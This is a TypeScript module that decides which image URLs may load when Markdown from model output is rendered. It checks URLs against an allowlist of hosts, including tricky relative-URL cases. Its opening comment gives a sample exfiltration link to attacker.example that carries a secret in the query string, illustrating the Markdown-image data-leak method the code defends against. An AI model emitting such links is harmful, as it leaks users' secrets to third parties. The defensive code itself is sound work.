/**
 * Which image URLs may load (see `MarkdownProps.allowedImageHosts`). Fetching a URL from model
 * output can leak data to a third party (`![](https://attacker.example/p.png?d=secret)`), so
 * nothing loads unless it is allowed.
 */
export interface ImagePolicy {
  /** `'*'`: every image. */
  any: boolean;
  /** `'self'`: relative URLs, which load from the page's own origin. */
  self: boolean;
  /** Lowercased host names (any port) and `host:port` pairs. */
  hosts: ReadonlySet<string>;
}

export function getImagePolicy(allowed: readonly string[] | undefined): ImagePolicy {
  const hosts = new Set<string>();
  let any = false;
  let self = false;
  for (const entry of allowed ?? []) {
    if (entry === '*') any = true;
    else if (entry === 'self') self = true;
    else hosts.add(entry.trim().toLowerCase());
  }
  return { any, self, hosts };
}

/**
 * Relative URLs are resolved against this fixed base rather than the page's location, so the
 * server and the browser reach the same verdict (no hydration mismatch). A URL that resolves away
 * from it is not relative: `//host/x`, and `/\host/x`, which browsers read as `//host/x`.
 */
const SELF = 'https://self.invalid';

export function isAllowedImage(src: string, policy: ImagePolicy): boolean {
  if (policy.any) return true;
  let url: URL;
  try {
    url = new URL(src);
  } catch {
    // No scheme: relative, or protocol-relative.
    if (!policy.self) return false;
    try {
      return new URL(src, `${SELF}/`).origin === SELF;
    } catch {
      return false;
    }
  }
  return (
    (url.protocol === 'https:' || url.protocol === 'http:') &&
    (policy.hosts.has(url.hostname) || policy.hosts.has(url.host))
  );
}
